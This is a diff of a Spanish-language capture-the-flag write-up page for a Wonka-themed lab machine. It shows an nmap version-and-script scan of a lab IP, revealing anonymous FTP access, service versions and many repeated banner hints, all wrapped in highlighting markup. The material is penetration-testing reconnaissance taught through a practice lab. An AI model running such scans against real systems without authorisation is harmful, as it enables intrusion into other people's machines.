-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">113/tcp open  ident?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: 
-</span><span class="s1">|_    http://localhost/key_rev_key &lt;- You will find the key here!!!
-</span><span class="s1">114/tcp open  audionews?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">115/tcp open  sftp?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">116/tcp open  ansanotify?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">117/tcp open  uucp-path?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">118/tcp open  sqlserv?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">119/tcp open  nntp?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">120/tcp open  cfdptkt?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GetRequest, HTTPOptions: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">121/tcp open  erpc?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">122/tcp open  smakynet?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">123/tcp open  ntp?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">124/tcp open  ansatrader?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
-</span><span class="s1">|     \|______________________;________________|
-</span><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
-</span><span class="s1">|_    hope you wont drown Augustus&#34;
-</span><span class="s1">125/tcp open  locus-map?
-</span><span class="s1">| fingerprint-strings: 
-</span><span class="s1">|   GenericLines, NULL: 
-</span><span class="s1">|     &#34;Welcome to chocolate room!! 
-</span><span class="s1">|     ___.---------------.
-</span><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
-<span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
-<span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="err">&#39;</span>_<span class="p">;</span>-----------------<span class="sb">`</span>
-<span class="p">|</span>     <span class="se">\|</span>______________________<span class="p">;</span>________________<span class="p">|</span>
-<span class="p">|</span>     small hint from Mr.Wonka : Look somewhere <span class="k">else</span>, its not here! <span class="p">;</span><span class="o">)</span> 
-<span class="p">|</span>_    hope you wont drown Augustus<span class="s2">&#34;
-</span></code></pre></div><table>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">───────┬──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: extractPorts.tmp
+</span></span><span class="line"><span class="cl">───────┼──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ <span class="o">[</span>*<span class="o">]</span> Extracting information...
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │     <span class="o">[</span>*<span class="o">]</span> IP Address: 10.10.250.47
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │     <span class="o">[</span>*<span class="o">]</span> Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,
+</span></span><span class="line"><span class="cl">       │ 113,114,115,116,117,118,119,120,121,122,123,124,125
+</span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ <span class="o">[</span>*<span class="o">]</span> Ports copied to clipboard
+</span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ 
+</span></span><span class="line"><span class="cl">───────┴──────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp  open  ftp         vsftpd 3.0.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rw-rw-r--    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>       <span class="m">208838</span> Sep <span class="m">30</span>  <span class="m">2020</span> gum_room.jpg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:10.10.10.10
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 1631bbfb51fcccc12148ff0d833b0089b <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e71fc9dbj3eaa44b672103ceedb1d3390 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b44502b62478gea9065f6c79448a06555e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http        Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/html).
+</span></span></span><span class="line"><span class="cl"><span class="s1">100/tcp open  newacct?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">101/tcp open  hostname?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">102/tcp open  iso-tsap?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">103/tcp open  gppitnp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">104/tcp open  acr-nema?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">105/tcp open  csnet-ns?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
